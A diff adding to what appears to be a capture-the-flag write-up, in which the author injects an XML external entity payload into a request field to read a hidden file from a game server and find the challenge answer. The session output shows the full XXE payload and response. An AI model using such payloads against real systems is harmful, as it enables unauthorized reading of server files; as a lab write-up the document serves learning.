@@ -361,13 +361,36 @@ Following the link in the URL in the `visit` attribute leads to another image:
 The image refers to a file called `goldring_to_be_deleted.txt`, but when fetching using XXE the replies are:
 * **Princess**: *Hmmm, and I thought you wanted me to take a look at that pretty silver ring, but instead, you've made a pretty bold REQuest. That's ok, but even if I knew anything about such things, I'd only use a secret TYPE of tongue to discuss them.*
 * **Fountain**: *She's definitely hiding something.*
+When in doubt, try to inject other parameters! So I just went ahead and moved the XXE payload to `who`, failing, and then to `reqType`, with success. Injecting the XXE in the `reqType` field gives the output:
+```bash
+thedead@dellian:~$ python3 icsemeller.py 
+MiniLembanh: 016a0d1a-4fc8-436e-82e9-d2a5cb3af2ae.BK7gX7h3wai0jWMi5kBwmo6Zbi0
+GCLB: df87fef86fd76566
+x-grinchum: IjMzNjEwMWIxNzc4ZDMyNWYxNTliODJjNDlkNTZmMTZhMmI0YjEzODMi.Y7cV7A.CXA7ZHTnxbmu_xHeSWxJSF1tEag
+Enter/Paste XML payload. Ctrl-D to end input.
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt">]>
+<root>
+    <imgDrop>img1</imgDrop>
+    <who>princess</who>
+    <reqType>&xxe;</reqType>
+</root>
+Payload is: <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt">]> <root>     <imgDrop>img1</imgDrop>     <who>princess</who>     <reqType>&xxe;</reqType> </root>
+Response: 
+{
+  "appResp": "No, really I couldn't. Really? I can have the beautiful silver ring? I shouldn't, but if you insist, I accept! In return, behold, one of Kringle's golden rings! Grinchum dropped this one nearby. Makes one wonder how 'precious' it really was to him. Though I haven't touched it myself, I've been keeping it safe until someone trustworthy such as yourself came along. Congratulations!^Wow, I have never seen that before! She must really trust you!",
+  "droppedOn": "none",
+  "visit": "static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png,200px,290px"
+}
+```
+The URL in the `visit` attribute points to the following image:  
+![goldring-morethansupertopsecret](imgs/goldring-morethansupertopsecret76394734.png)  
+The name of this last file is the answer to the challenge: `goldring-morethansupertopsecret76394734.png`.
 
-
-
-
-
-
-
+##### Kudos
+###### A shot in the dark, `@i81b4u`
+I absolutely have to thank `i81b4u`, who basically appeared in all my reports for the last 2 years now. Quick but invaluable support! I decided to give you a face, is [it](https://creator.nightcafe.studio/creation/U1HT5QnChUcnAgbQqhts) accurate?  
+![i81b4u](imgs/i81b4u.jpg)
 
 ---
 ## Recover the Web Ring
